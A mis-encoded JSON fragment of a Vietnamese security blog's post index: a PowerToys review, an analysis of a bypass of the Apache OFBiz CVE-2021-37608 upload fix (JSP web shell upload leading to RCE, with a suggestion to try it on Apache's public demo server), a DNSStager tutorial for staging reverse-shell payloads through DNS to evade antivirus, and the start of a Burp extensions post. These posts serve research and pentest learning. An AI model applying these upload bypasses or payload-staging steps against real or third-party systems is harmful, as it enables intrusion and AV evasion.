nƒÉng ƒë·∫ßu ti√™n m√¨nh s·ª≠ d·ª•ng, n√≥ c√≥ th·ªÉ t·ª± do tho·∫£i m√°i custom layout n√†o m√† m√¨nh mu·ªën, chia c√°i m√†n h√¨nh ra nhi·ªÅu √¥ kh√°c nhau ƒë·ªÅu ƒë∆∞·ª£c tu·ªët, c√≥ c·∫£ h·ªá th·ªëng ph√≠m t·∫Øt ƒë·ªÉ thay ƒë·ªïi layout c·∫ßn thi·∫øt (+10 ƒëi·ªÉm)\nC√≥ nhi·ªÅu c√°ch setting kh√°c nhau, c√°c b·∫°n t·ª± tr·∫£i nghi·ªám th√¨ m·ªõi th·∫•y ƒë∆∞·ª£c ƒë·ªô th√∫ v·ªã c·ªßa n√≥ :D\n√Ä gi·ªØ n√∫t Shift r·ªìi k√©o app th√¨ ƒë∆∞·ª£c nh√©, c√≥ c√°i tu·ª≥ ch·ªçn b√™n d∆∞·ªõi ƒë√≥ :D\n ƒê·ªçc th√™m t·∫°i: https://docs.microsoft.com/en-us/windows/powertoys/fancyzones\n Awake ƒê√∫ng nh∆∞ c√°i t√™n c·ªßa n√≥, t√≠nh nƒÉng n√†y s·ª≠ d·ª•ng ƒë·ªÉ khi·∫øn m√†n h√¨nh lu√¥n b·∫≠t. C≈©ng ti·ªán so v·ªõi m√¨nh v√¨ m√¨nh c·∫Øm d√¢y loa v√†o m√†n h√¨nh, m·ªói khi m√¨nh mu·ªën nghe nh·∫°c m√† m√†n h√¨nh t·∫Øt l√† loa t·∫Øt theo lu√¥n, kh√° phi·ªÅn =))\n ƒê·ªçc th√™m t·∫°i: https://docs.microsoft.com/en-us/windows/powertoys/awake\n Color Picker Hmm, c√°i t√≠nh nƒÉng n√†y m√¨nh th√¨ ch∆∞a x√†i t·ªõi m·∫•y nh∆∞ng ch·∫Øc h·∫≥n c√°c b·∫°n l√†m front-end s·∫Ω hay x√†i t·ªõi n√≥, n√≥ s·∫Ω copy ch√≠nh x√°c c√°i m√£ m√†u m√† c√°c b·∫°n ƒëang tr·ªè chu·ªôt v√†o theo nhi·ªÅu ƒë·ªãnh d·∫°ng kh√°c nhau, ti·ªán ph·∫øt ;)\n ƒê·ªçc th√™m t·∫°i: https://docs.microsoft.com/en-us/windows/powertoys/color-picker\n PowerToys Run Tr√¥ng qu·∫£ h√¨nh n√†y c√°c b·∫°n quen quen ƒë√∫ng k =)), n√≥ s·ª≠ d·ª•ng ƒë·ªÉ search app, search file,\u0026hellip; ƒë·ªß th·ª© kh√°c n·ªØa, kh√° l√† nhanh. ƒê∆∞·ª£c c√°i h·ªá th·ªëng ph√≠m t·∫Øt ƒëa d·∫°ng ph·∫øt.\n ƒê·ªçc th√™m: https://docs.microsoft.com/en-us/windows/powertoys/run\n \u0026hellip; ƒê√¢y l√† m√†n h√¨nh c·ªßa m√¨nh sau khi ƒë∆∞·ª£c chia, c√°c b·∫°n th·∫•y th·∫ø n√†o ;)\nN√≥i chung l√† c√≤n nhi·ªÅu t√≠nh nƒÉng l·∫Øm, c√°c b·∫°n t·ª´ t·ª´ xem r·ªìi x√†i th·ª≠ nh√©. M√¨nh x√†i n√≥ ti·∫øp ƒë√¢y, bye :D\n","permalink":"https://minhtuanact.ml/posts/chia-man-hinh-workspace-va-du-tro-khac-voi-powertoys/","summary":"Root case Hi, d·∫°o g·∫ßn ƒë√¢y ch·∫Øc h·∫≥n c√°c b·∫°n, anh em ƒëang l√†m vi·ªác t·∫°i nh√† do d·ªãch (ch·∫Øc c≈©ng c√≥ c√°c b·∫°n ƒë√£ l√†m offline r·ªìi). M√¨nh th√¨ c≈©ng v·∫´n ƒëang l√†m vi·ªác t·∫°i nh√†, c≈©ng d√†nh 1 √≠t ƒë·ªÉ upgrade c√°i workspace c·ªßa m√¨nh l√™n m·ªôt t√Ω. M√¨nh th·∫•y c√≥ 1 v·∫•n ƒë·ªÅ l√† khi m√¨nh n√¢ng c·∫•p s·ª≠ d·ª•ng m√†n h√¨nh FHD l√™n m√†n h√¨nh QHD (2K), do c√°i m√†n 2K n√≥ to h∆°n, v√† nhi·ªÅu kh√¥ng gian hi·ªÉn th·ªã h∆°n n√™n m√¨nh kh√¥ng th·ªÉ nh√¨n th·∫•y h·∫øt to√†n b·ªô n·ªôi dung hi·ªÉn th·ªã tr√™n m√†n h√¨nh ƒë∆∞·ª£c (m·ªü tr√¨nh duy·ªát full m√†n h√¨nh l√† kh√¥ng th·ªÉ nh√¨n h·∫øt ho·∫∑c c√≥ nh·ªØng ph·∫ßn b·ªã th·ª´a, r·∫•t ph√≠)","title":"Chia m√†n h√¨nh Workspace v√† ƒë·ªß tr√≤ kh√°c v·ªõi PowerToys"},{"content":"G·∫ßn ƒë√¢y m√¨nh th·∫•y c√≥ 1 CVE v·ªõi Apache Ofbiz CVE-2021-37608, c√°c b·∫°n c√≥ th·ªÉ ƒë·ªçc th√™m issue t·∫°i ƒë√¢y https://issues.apache.org/jira/browse/OFBIZ-12297, tuy nhi√™n m√¨nh c·∫£m th·∫•y b·∫£n patch h∆°i ·∫£o ma 1 ch√∫t\n M√¨nh ph√¢n t√≠ch c√°i CVE n√†y do n√≥ o√°nh ƒëi·ªÉm CVSS l√† 9.8, tuy nhi√™n khi v√†o nghi√™n c·ª©u th√¨ n√≥ v·∫´n c·∫ßn authen, th·∫ø ƒëi·ªÉm 9.8 ·ªü ƒë√¢u ra nh·ªâ :-?\nHo·∫∑c c≈©ng c√≥ th·ªÉ l√† do m√¨nh g√† n√™n ch∆∞a t√¨m ƒë∆∞·ª£c endpoint unauthen n·ªØa :D\n D·ª±ng m√¥i tr∆∞·ªùng Debug V·ªÅ ph·∫ßn n√†y c√≥ b·∫°n Ng·ªçc Anh ƒë√£ h∆∞·ªõng d·∫´n d·ª±ng m√¥i tr∆∞·ªùng debug ofbiz v·ªõi Intelijin r·ªìi, c√°c b·∫°n c√≥ th·ªÉ gh√© qua xem h∆∞·ªõng d·∫´n nh√©\n·ªû ƒë√¢y m√¨nh ƒëang s·ª≠ d·ª•ng b·∫£n release17.12.08, download t·∫°i https://github.com/apache/ofbiz-framework/releases/tag/release17.12.08\nH∆∞·ªõng d·∫´n debug: https://viblo.asia/p/phan-tich-cve-2021-30128-apache-ofbiz-63vKjdGVl2R\nPh√¢n t√≠ch CVE-2021-37608 vulnerability bypass C√≥ th·ªÉ th·∫•y b·∫£n path c·ªßa CVE-2021-37608 kh√° s∆° s√†i, c√°c b·∫°n c√≥ th·ªÉ ki·ªÉm tra t·∫°i ƒë√¢y\nhttps://github.com/apache/ofbiz-framework/commit/8d49af4/\nB·∫£n path n√†y fix m·ªói c√°i ch·ªó isValidFile, chuy·ªÉn c√°i fileToCheck sang file.toString()\nM√¨nh ƒë√£ d·ª±ng m√¥i tr∆∞·ªùng l√™n, v√† t√¨m th·∫•y endpoint t·∫°i Image Management https://127.0.0.1:8443/catalog/control/ImageUpload\nƒê·∫∑t breakpoint t·∫°i d√≤ng 157 t·∫°i org/apache/ofbiz/product/imagemanagement/ImageManagementServices.java\nTa c√≥ th·ªÉ th·∫•y gi√° tr·ªã file=C:\\Research\\Java\\ofbiz-framework-release17.12.08\\themes\\common\\webapp\\images\\products\\management\\WG-9943\\shell.jsp t·ª©c l√† to√†n b·ªô n·ªôi dung file ƒë√£ ƒë∆∞·ª£c upload l√™n server, v√† gi·ªØ nguy√™n t√™n file shell.jsp (ki·ªÉm tra l·∫°i file trong server th√¨ ƒë√∫ng l√† th·∫ø th·∫≠t, file kh√¥ng h·ªÅ b·ªã s·ª≠a ƒë·ªïi g√¨).\nT·∫°i ƒë√¢y c√≥ th·ªÉ s·ª≠ d·ª•ng Race Condition t·ªõi RCE (t·ª©c l√† b·∫°n s·∫Ω li√™n t·ª•c upload file shell.jsp v√† truy c·∫≠p ƒë·∫øn URL https://127.0.0.1:8443/images/products/management/WG-9943/shell.jsp l√† c√≥ th·ªÉ g·ªçi file shell l√™n).\nTuy nhi√™n, khi ph√¢n t√≠ch s√¢u h∆°n th√¨ m·ªôt v·∫•n ƒë·ªÅ n·ªØa t·∫°i h√†m isValidFile t·∫°i org/apache/ofbiz/security/SecuredUpload.java\nXem online t·∫°i: https://github.com/apache/ofbiz-framework/blob/54acc03858eb28bb13dbf17c32d5e394b42ff869/framework/security/src/main/java/org/apache/ofbiz/security/SecuredUpload.java#L102:L219\nT·∫°i ƒë√¢y m√¨nh s·∫Ω chia ra l√†m 3 case kh√°c nhau:\nUpload file ·∫£nh b√¨nh th∆∞·ªùng: Pass ƒë∆∞·ª£c qua h·∫øt c√°c check file v√† gi·ªØ l·∫°i file ·∫£nh tr√™n server\nUpload file jsp:  ƒê·∫ßu ti√™n s·∫Ω pass ƒë∆∞·ª£c qua check filename b·∫±ng 1 ƒëo·∫°n regex [a-zA-Z0-9-_ ]{1,249}.[a-zA-Z0-9-_ ]{1,10}, ƒëo·∫°n n√†y ch·ªâ check xem file name ch·ªâ t·ªìn t·∫°i 1 d·∫•u . duy nh·∫•t hay kh√¥ng th√¥i, t√™n file kh√¥ng ch·ª©a k√Ω t·ª± l·∫° l√πng g√¨ c·∫£.   Code: https://github.com/apache/ofbiz-framework/blob/54acc03858eb28bb13dbf17c32d5e394b42ff869/framework/security/src/main/java/org/apache/ofbiz/security/SecuredUpload.java#L108:L134\n  Ti·∫øp theo ƒë·∫øn ph·∫ßn check c√≥ ph·∫£i file image, PDF, v√¢n v√¢n m√¢y m√¢y hay kh√¥ng b·∫±ng c√°ch check header c·ªßa file ƒë√≥. N·∫øu k ƒë∆∞·ª£c break th√¨ s·∫Ω t·ªõi ƒëo·∫°n xo√° file ƒëi 1 2 3 4 5  File badFile = new File(fileToCheck); if (!badFile.delete()) { Debug.logError(\u0026#34;File :\u0026#34; + fileToCheck + \u0026#34;, couldn\u0026#39;t be deleted\u0026#34;, MODULE); } return false;   Tuy nhi√™n to√†n b·ªô qu√° tr√¨nh check file tr√™n file ƒë√£ t·ªìn t·∫°i tr√™n server, c√≥ th·ªÉ race condition ƒë·ªÉ RCE nh∆∞ m√¨nh n√≥i b√™n tr√™n  Upload file jsp nh∆∞ng kh√¥ng b·ªã xo√° file:  Nh∆∞ b√™n tr√™n th√¨ c√°c b·∫°n c√≥ th·ªÉ follow theo lu·ªìng ho·∫°t ƒë·ªông check file, nh∆∞ng ƒë·∫øn t·∫≠n cu·ªëi c√πng c·ªßa lu·ªìng check file th√¨ m·ªõi xo√° file =\u0026gt; V·∫≠y ch·ªâ c·∫ßn upload file kh√¥ng h·ª£p l·ªá nh∆∞ng l·∫°i kh√¥ng b·ªã xo√° file l√† xong 1 2 3 4 5 6 7 8  if (wrongFile) { Debug.logError(\u0026#34;Uploaded file \u0026#34; + \u0026#34; should contain only Alpha-Numeric characters, hyphen, underscore and spaces,\u0026#34; + \u0026#34; only 1 dot as an input for the file name and the extension.\u0026#34; + \u0026#34;The file name and extension should not be empty at all\u0026#34;, MODULE); return false; }    T·∫°i ƒë√¢y c√≥ ƒëo·∫°n code check wrongFile, n·∫øu l√† wrongFile kh√¥ng tho·∫£ m√£n b·∫•t k·ª≥ ƒëi·ªÅu g√¨ m√¥ t·∫£ ·ªü logError th√¨ s·∫Ω return false v√† kh√¥ng c√≥ b·∫•t k·ª≥ h√†nh ƒë·ªông xo√° file tr√™n server g√¨ c·∫£. Th·∫ø n√™n ho√†n to√†n ta c√≥ th·ªÉ upload file v√≠ d·ª• nh∆∞ shell.png.jsp, ho·∫∑c %%abc.jsp \u0026hellip; ƒë·ªÉ upload file shell jsp l√™n server, v√† t·ª´ ƒë√¢y ch√∫ng ta c√≥ th·ªÉ RCE v·ªõi quy·ªÅn user ƒë∆∞·ª£c ph√©p upload ·∫£nh s·ª≠ d·ª•ng t√≠nh nƒÉng Image Management  K·∫øt lu·∫≠n V·∫≠y bypass CVE-2021-37608 c√≥ 2 c√°ch kh√°c nhau c√≥ th·ªÉ bypass upload file, s·ª≠ d·ª•ng upload file jsp r·ªìi race condition ƒë·ªÉ RCE, ho·∫∑c d·ªÖ d√†ng h∆°n c·∫£ l√† upload file kh√¥ng tho·∫£ m√£n ƒëi·ªÅu ki·ªán v√† kh√¥ng b·ªã xo√° file tr√™n server l√† c√≥ th·ªÉ RCE ƒë∆∞·ª£c.\nHi·ªán t·∫°i l·ªói ch∆∞a ƒë∆∞·ª£c fix tr√™n b·∫£n demo, c√°c b·∫°n c√≥ th·ªÉ s·ª≠ d·ª•ng server demo c·ªßa apache ƒë·ªÉ th·ª≠ xem sao https://demo-stable.ofbiz.apache.org\nTham kh·∫£o  https://issues.apache.org/jira/browse/OFBIZ-12297 https://issues.apache.org/jira/browse/OFBIZ-12307 https://viblo.asia/p/phan-tich-cve-2021-30128-apache-ofbiz-63vKjdGVl2R  ","permalink":"https://minhtuanact.ml/posts/phan-tich-lo-hong-uploadfile-tren-apache-ofbiz-cve-2021-37608-bypass/","summary":"G·∫ßn ƒë√¢y m√¨nh th·∫•y c√≥ 1 CVE v·ªõi Apache Ofbiz CVE-2021-37608, c√°c b·∫°n c√≥ th·ªÉ ƒë·ªçc th√™m issue t·∫°i ƒë√¢y https://issues.apache.org/jira/browse/OFBIZ-12297, tuy nhi√™n m√¨nh c·∫£m th·∫•y b·∫£n patch h∆°i ·∫£o ma 1 ch√∫t\n M√¨nh ph√¢n t√≠ch c√°i CVE n√†y do n√≥ o√°nh ƒëi·ªÉm CVSS l√† 9.8, tuy nhi√™n khi v√†o nghi√™n c·ª©u th√¨ n√≥ v·∫´n c·∫ßn authen, th·∫ø ƒëi·ªÉm 9.8 ·ªü ƒë√¢u ra nh·ªâ :-?\nHo·∫∑c c≈©ng c√≥ th·ªÉ l√† do m√¨nh g√† n√™n ch∆∞a t√¨m ƒë∆∞·ª£c endpoint unauthen n·ªØa :D","title":"Ph√¢n t√≠ch l·ªó h·ªïng uploadfile tr√™n Apache Ofbiz (CVE-2021-37608 bypass)"},{"content":"V√≠ d·ª• lu√¥n cho n√≥ uy t√≠n (ngu·ªìn https://shells.systems)\nM·ªü ƒë·∫ßu ƒê·ªëi v·ªõi c√°c b·∫°n redteam, vi·ªác ƒëi s√¢u nh·∫•t v√†o trong h·ªá th·ªëng c·ªßa kh√°ch h√†ng l√† ƒëi·ªÅu lu√¥n c·∫ßn ƒë·∫°t ƒë∆∞·ª£c, ƒë·ªÉ ƒë·∫£m b·∫£o an to√†n cho nh·ªØng kh√°ch h√†ng c·ªßa m√¨nh. Hay v·ªõi 1 bug bounty hunter c·∫ßn n√¢ng severity c·ªßa l·ªó h·ªïng m√¨nh t√¨m ra l√™n cao nh·∫•t ƒë·ªÉ nh·∫≠n ƒë∆∞·ª£c s·ªë ti·ªÅn h·∫≠u hƒ©nh. C√≥ th·ªÉ c√°c b·∫°n redteam/pentester c≈©ng g·∫∑p ph·∫£i tr∆∞·ªùng h·ª£p payload c·ªßa m√¨nh b·ªã AV xo√°/ch·∫∑n nh∆∞ th·∫ø n√†o, c√¥ng c·ª• n√†y gi√∫p c√°c b·∫°n c√≥ th·ªÉ ·∫©n payload c·ªßa m√¨nh v√† truy·ªÅn n√≥ v·ªõi t·ª´ng ph·∫ßn, gi√∫p AV kh√¥ng ph√°t hi·ªán ra. ƒê√¢y c≈©ng l√† m·ªôt ƒëi·ªÅu m√† c√°c AV tr√™n th·∫ø gi·ªõi c·∫ßn ƒë·ªÉ t√¢m ƒë·∫øn v√† gi√∫p ng∆∞·ªùi d√πng c·ªßa m√¨nh an to√†n.\nDNSStager l√† g√¨? DNSStager l√† m·ªôt tool open source ƒë∆∞·ª£c s·ª≠ d·ª•ng ƒë·ªÉ gi√∫p Pentesters/RedTeamers c√≥ th·ªÉ ·∫©n payload c·ªßa h·ªç trong DNS v√† truy·ªÅn n√≥ d∆∞·ªõi d·∫°ng t·ª´ng ph·∫ßn, d·ª±a tr√™n nhi·ªÅu DNS records v√† sau ƒë√≥ inject n√≥ v√†o memory v√†\nDNSStager s·∫Ω t·∫°o m·ªôt DNS Server pha-ke cho b·∫°n ƒë·ªÉ resolve DNS fake addresses c·ªßa b·∫°n d·ª±a tr√™n c√°c AAAA v√† TXT records, c√°c address n√†y ƒëang hi·ªÉn th·ªã m·ªôt ph·∫ßn payload encoded/encrypted c·ªßa b·∫°n.\nC√°ch ho·∫°t ƒë·ªông c·ªßa DNSStager (ngu·ªìn https://shells.systems)\nNh∆∞ h√¨nh c√°c b·∫°n c√≥ th·ªÉ th·∫•y, khi execute client.exe, n√≥ s·∫Ω t·ª± ƒë·ªông g·ªçi t·ªõi DNSStager Server v·ªõi nh·ªØng DNS kh√°c nhau (·ªü ƒë√¢y l√† s1.test.mydnsserver.live, s2.test.mydnsserver.live, \u0026hellip;). Sau ƒë√≥, n√≥ s·∫Ω c·ªë g·∫Øng resolve subdomain n√†y v√† nh·∫≠n v·ªÅ response c√≥ th·ªÉ l√† d·∫°ng IPv6 ho·∫∑c TXT records. Tuy nhi√™n, ƒë√¢y ch√≠nh l√† t·ª´ng ƒëo·∫°n payload c·ªßa b·∫°n g·ª≠i d∆∞·ªõi d·∫°ng 16 bytes m·ªôt, v√† khi k·∫øt h·ª£p c√°c bytes n√†y s·∫Ω ƒë∆∞·ª£c 1 payload ho√†n ch·ªânh.\nT·∫°i sao l·∫°i s·ª≠ d·ª•ng DNSStager Tr∆∞·ªùng h·ª£p s·ª≠ d·ª•ng t·ªët nh·∫•t cho DNSStager l√† khi b·∫°n c·∫ßn n·∫°p payload c·ªßa m√¨nh th√¥ng qua DNS trong khi ƒë√≥ l√† k√™nh duy nh·∫•t c√≥ s·∫µn ƒë·ªÉ b·∫°n truy·ªÅn payload.\nDNSStager hi·ªán h·ªó tr·ª£ hai DNS records ƒë·ªÉ truy·ªÅn to√†n b·ªô payload ƒë√≥ l√†:\n IPv6 qua AAAA records. TXT records.  C√†i ƒë·∫∑t DNSStager Vi·ªác c√†i ƒë·∫∑t DNSStager c≈©ng kh√° ƒë∆°n gi·∫£n\n1 2  git clone https://github.com/mhaskar/DNSStager sudo python3 -m pip install -r requirements.txt   (y√™u c·∫ßu s·ª≠ d·ª•ng python3) Do DNSStager th·ª±c hi·ªán generate client connect s·ª≠ d·ª•ng C ho·∫∑c Golang n√™n y√™u c·∫ßu c√†i ƒë·∫∑t 1 trong 2, tu·ª≥ thu·ªôc b·∫°n s·ª≠ d·ª•ng c√°i n√†o ƒë·ªÉ generate\n1 2 3  sudo apt-get install mingw-w64 ho·∫∑c sudo apt-get install golang (golang t·ª´ 1.16)   DNSStager y√™u c·∫ßu ch·∫°y v·ªõi quy·ªÅn root\n L∆∞u √Ω: C·∫ßn disable systemd-resolved ƒë·ªÉ DNSStager ho·∫°t ƒë·ªông ƒë√∫ng mong mu·ªën\n 1  sudo systemctl disable systemd-resolved   C√≥ kh√° nhi·ªÅu options trong DNSStager, m√¨nh s·∫Ω n√≥i r√µ b√™n d∆∞·ªõi nh√©.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  ‚îå‚îÄ‚îÄ(minhtuan„âøMinhTuan-ACER)-[~/Tools/DNSStager] ‚îî‚îÄ$ sudo ./dnsstager.py -h [sudo] password for minhtuan: usage: dnsstager.py [-h] [--domain DOMAIN] [--payloads] [--prefix PREFIX] [--payload PAYLOAD] [--output OUTPUT] [--shellcode_path SHELLCODE_PATH] [--xorkey XORKEY] [--sleep SLEEP] DNSStager main parser optional arguments: -h, --help show this help message and exit --domain DOMAIN The domain you want to use as staging host --payloads show all payloads --prefix PREFIX Prefix to use as part of your subdomain schema --payload PAYLOAD Payload to use, see --payloads for more details --output OUTPUT Agent output path --shellcode_path SHELLCODE_PATH Shellcode file path --xorkey XORKEY XOR key to encode your payload with --sleep SLEEP sleep for N seconds between each DNS request   C√†i ƒë·∫∑t DNS ƒê·ªÉ s·ª≠ d·ª•ng DNSStager, b·∫°n c·∫ßn ƒë·∫∑t domain c·ªßa m√¨nh tr·ªè t·ªõi DNSStager l√†m Server DNS ƒë·ªÉ resolve v√† handle b·∫•t k·ª≥ request DNS n√†o ƒë·∫øn domain c·ªßa b·∫°n.\n(ngu·ªìn https://shells.systems/)\nV√≠ d·ª•, m√¨nh ƒëang c√≥ m·ªôt domain l√† mydnsserver.live, DNSStager ƒëang ch·∫°y tr√™n VPS server c√≥ IP 139.59.182.177 th√¨ config nh∆∞ h√¨nh tr√™n nh√©.\nS·ª≠ d·ª•ng DNSStager C√°ch d√πng c≈©ng kh√° ƒë∆°n gi·∫£n tuy nhi√™n c≈©ng l·∫Øm b∆∞·ªõc, c√°c b·∫°n c√†i ƒë·∫∑t th√†nh c√¥ng nh∆∞ b√™n tr√™n l√† c√≥ th·ªÉ s·ª≠ d·ª•ng DNSStager th√†nh c√¥ng r·ªìi.\nHi·ªán t·∫°i DNSStager s·ª≠ d·ª•ng 6 payload, h·ªó tr·ª£ vi·ªác g·ª≠i truy·ªÅn payload d∆∞·ªõi d·∫°ng IPv6 ho·∫∑c TXT records, s·ª≠ d·ª•ng ng√¥n ng·ªØ C hay Golang ƒë·ªÉ generate file tu·ª≥ theo ki·∫øn tr√∫c x86 ho·∫∑c x64\n1 2 3 4 5 6 7 8 9 10  sudo ./dnsstager.py --payloads [+] 6 DNSStager payloads Available x64/c/ipv6 Resolve your payload as IPV6 addresses xored with custom key via compiled x64 C code x86/c/ipv6 Resolve your payload as IPV6 addresses xored with custom key via compiled x86 C code x64/golang/txt Resolve your payload as TXT records encoded using base64 compiled x64 GoLang code x64/golang/ipv6 Resolve your payload as IPV6 addresses encoded with custom key using byte add encoding via compiled x64 GoLang code x86/golang/txt Resolve your payload as TXT records encoded using base64 compiled x86 GoLang code x86/golang/ipv6 Resolve your payload as IPV6 addresses encoded with custom key using byte add encoding via compiled x86 GoLang code   Gen file execute v√† truy·ªÅn payload ch·ªâ v·ªõi m·ªôt c√¢u l·ªánh\n1  sudo ./dnsstager.py --domain test.mydnsserver.live --payload x64/c/ipv6 --output /tmp/a.exe --prefix cloud-srv- --shellcode_path ~/payload.bin --sleep 1 --xorkey 0x20   V·ªõi ~/payload.bin c√≥ th·ªÉ l√† file reverse shell c·ªßa b·∫°n nh√©\nTool s·∫Ω t·ª± ƒë·ªông generate ra file execute r·ªìi th·ª±c hi·ªán l·∫Øng nghe lu√¥n. Sau ƒë√≥ c√°c b·∫°n c√≥ th·ªÉ l·∫•y file /tmp/a2.exe t·∫£i l√™n r·ªìi ch·∫°y tr√™n ph√≠a m√°y mu·ªën t·∫°o k·∫øt n·ªëi l√† c√≥ th·ªÉ reverse shell qua m·∫∑t Windows Security r·ªìi.\nTuy nhi√™n, m√¨nh demo t·∫°o file th√¨ v·ªõi l·∫ßn ƒë·∫ßu ch·∫°y l√™n th√¨ Windows Security kh√¥ng b√°o g√¨ c·∫£, cho ph√©p th·ª±c thi, sau ƒë√≥ th√¨ \u0026hellip; kh√¥ng c√≤n sau ƒë√≥ n·ªØa, c·ª© t·∫°o file l√† Windows Security th√¥ng b√°o l√† trojan v√† xo√° lu√¥n :(. Hy v·ªçng l√† c√≥ th·ªÉ t√¨m ra nguy√™n nh√¢n n√†o ƒë√≥, v√† ƒë·ªôi dev c√≥ th·ªÉ fix l·ªói n√†y :(. V·ªÅ ph·∫ßn demo c√°c b·∫°n k√©o l√™n ƒë·∫ßu b√†i l√† c√≥ th·ªÉ th·∫•y nh√© ;)\nD∆∞·ªõi ƒë√¢y l√† v√≠ d·ª• h·ªç ƒë√£ check xem data payload g·ª≠i sang ƒë√∫ng hay ch∆∞a, th·ª±c hi·ªán l·∫•y payload r·ªìi XOR v·ªõi 0x20 xem 16 bytes ƒë·∫ßu ti√™n ƒë√£ kh·ªõp v·ªõi k·∫øt qu·∫£ IPv6 records tr·∫£ v·ªÅ.  Hi v·ªçng c√≥ th·ªÉ ƒëem ƒë∆∞·ª£c demo x·ªãn cho m·ªçi ng∆∞·ªùi tham kh·∫£o, ho·∫∑c c√≥ v·∫ª th·ªùi ƒëi·ªÉm m√¨nh vi·∫øt b√†i n√†y Microsoft ƒë√£ c·∫≠p nh·∫≠t cho Windows Security c·ªßa h·ªç r·ªìi. Nh∆∞ng k·ªπ thu·∫≠t n√†y v·∫´n ƒë√°ng h·ªçc h·ªèi m√† ph·∫£i kh√¥ng. M√¨nh s·∫Ω c·ªë g·∫Øng nghi√™n c·ª©u th√™m v·ªÅ ph·∫ßn n√†y r·ªìi chia s·∫ª t·ªõi m·ªçi ng∆∞·ªùi. See you!\n Tham kh·∫£o  https://shells.systems/unveiling-dnsstager-a-tool-to-hide-your-payload-in-dns/ https://github.com/mhaskar/DNSStager  ","permalink":"https://minhtuanact.ml/posts/dnsstager-cong-cu-giup-ban-an-payload-trong-dns/","summary":"V√≠ d·ª• lu√¥n cho n√≥ uy t√≠n (ngu·ªìn https://shells.systems)\nM·ªü ƒë·∫ßu ƒê·ªëi v·ªõi c√°c b·∫°n redteam, vi·ªác ƒëi s√¢u nh·∫•t v√†o trong h·ªá th·ªëng c·ªßa kh√°ch h√†ng l√† ƒëi·ªÅu lu√¥n c·∫ßn ƒë·∫°t ƒë∆∞·ª£c, ƒë·ªÉ ƒë·∫£m b·∫£o an to√†n cho nh·ªØng kh√°ch h√†ng c·ªßa m√¨nh. Hay v·ªõi 1 bug bounty hunter c·∫ßn n√¢ng severity c·ªßa l·ªó h·ªïng m√¨nh t√¨m ra l√™n cao nh·∫•t ƒë·ªÉ nh·∫≠n ƒë∆∞·ª£c s·ªë ti·ªÅn h·∫≠u hƒ©nh. C√≥ th·ªÉ c√°c b·∫°n redteam/pentester c≈©ng g·∫∑p ph·∫£i tr∆∞·ªùng h·ª£p payload c·ªßa m√¨nh b·ªã AV xo√°/ch·∫∑n nh∆∞ th·∫ø n√†o, c√¥ng c·ª• n√†y gi√∫p c√°c b·∫°n c√≥ th·ªÉ ·∫©n payload c·ªßa m√¨nh v√† truy·ªÅn n√≥ v·ªõi t·ª´ng ph·∫ßn, gi√∫p AV kh√¥ng ph√°t hi·ªán ra.","title":"DNSStager - C√¥ng c·ª• gi√∫p b·∫°n ·∫©n payload trong DNS"},{"content":"B√†i n√†y l√† b√†i n·ªëi ti·∫øp v·ªÅ m·ªôt b√†i m√† m√¨nh ƒë√£ vi·∫øt t·∫°i M·ªôt v√†i m·∫πo m√† m√¨nh s·ª≠ d·ª•ng v·ªõi Burp Suite. B√†i ƒë·∫ßu ti√™n m√¨nh ƒë√£ vi·∫øt v·ªÅ m·ªôt v√†i tips v√† trick m√¨nh hay s·ª≠ d·ª•ng v·ªõi Burp Suite m·∫∑c ƒë·ªãnh r·ªìi, b√†i n√†y m√¨nh s·∫Ω vi·∫øt v·ªÅ m·ªôt v√†i extensions c·ªßa Burp Suite m√† m√¨nh hay d√πng nh√© ;)\nBurp Extensions ƒê√¢y l√† m·ªôt h√¨nh ch·ª•p nhanh c√°c extension trong Burp Suite c·ªßa m√¨nh, hi·ªán t·∫°i th√¨ v√†i c√°i th√¨ hay d√πng, v√†i c√°i th√¨ x√†i r·ªìi th√¥i kh√¥ng x√†i n·ªØa, m√¨nh ch·ªâ ƒëi·ªÉm qua nh·ªØng c√°i m√† m√¨nh c·∫£m th·∫•y hay v√† m·ªçi ng∆∞·ªùi c√≥ th·ªÉ d√πng n√≥ nh√© :D\nAutorize V·ªÅ extension n√†y th√¨ m√¨nh ƒë√£ c√≥ m·ªôt b√†i vi·∫øt t·∫°i T√¨m ki·∫øm c√°c l·ªói IDOR, ch∆∞a bao gi·ªù l·∫°i d·ªÖ ƒë·∫øn th·∫ø v·ªõi extension Autorize, extension n√†y h·ªó tr·ª£ kh√° hi·ªáu qu·∫£ trong vi·ªác t√¨m ki·∫øm IDOR c·ªßa c√°c project pentest m√¨nh tham gia. M√¨nh lu√¥n lu√¥n b·∫≠t n√≥ m·ªói khi pentest d·ª± √°n, tuy nhi√™n m·ªôt ƒëi·ªÅu kh√° phi·ªÅn to√°i l√† n√≥ s·∫Ω t·∫°o ra data duplicate n·∫øu 2 user ƒë·ªÅu c√≥ th·ªÉ t·∫°o ƒë∆∞·ª£c data. Kh·∫Øc ph·ª•c ƒëi·ªÅu n√†y th√¨ b·∫°n c√≥ th·ªÉ th√™m black rules, ƒë·∫øn c√°i URI ƒë√≥ th√¨ k test l√† ƒë∆∞·ª£c :D\nTurbo Intruder N·∫øu b·∫°n n√†o c√≥ test race condition r·ªìi th√¨ ch·∫Øc h·∫≥n c√≥ s·ª≠ d·ª•ng qua Intruder r·ªìi, c√≤n Turbo Intruder l√† phi√™n b·∫£n n√¢ng c·∫•p c·ªßa Intruder, m√¨nh c√≥ th·ªÉ code payload b·∫±ng python ƒë·ªÉ ki·ªÉm tra race condition ho·∫∑c l√†m vi·ªác kh√°c v·ªõi t·ªëc ƒë·ªô kinh d·ªã h∆°n r·∫•t nhi·ªÅu. Turbo Intruder ƒë∆∞·ª£c James Kettle (aka @albinowax) t·∫°o ra. N√≥ kh√° nhi·ªÅu c√°c code m·∫´u (example), h·ªó tr·ª£ kh√° nhi·ªÅu t√≠nh nƒÉng nh∆∞ Multi-host, Multiple parameters,\u0026hellip; B·∫°n ƒë·ªçc c√≥ th·ªÉ ƒë·ªçc th√™m t·∫°i https://portswigger.net/research/turbo-intruder-embracing-the-billion-request-attack\nCopy As Python-Requests C√°c b·∫°n ƒë√£ qu√° m·ªát m·ªèi v√¨ ph·∫£i import m·ªôt ƒë·ªëng d·ªØ li·ªáu b·∫±ng tay, c√°c b·∫°n ƒë√£ nghƒ© ƒë·∫øn code tool b·∫±ng python ƒë·ªÉ import cho n√≥ nhanh. ƒê√¢y r·ªìi, extension n√†y d√†nh cho b·∫°n, th·∫≠t s·ª± l√† n√≥ ƒë√£ c·ª©u c√°nh m√¨nh kh√¥ng bi·∫øt bao 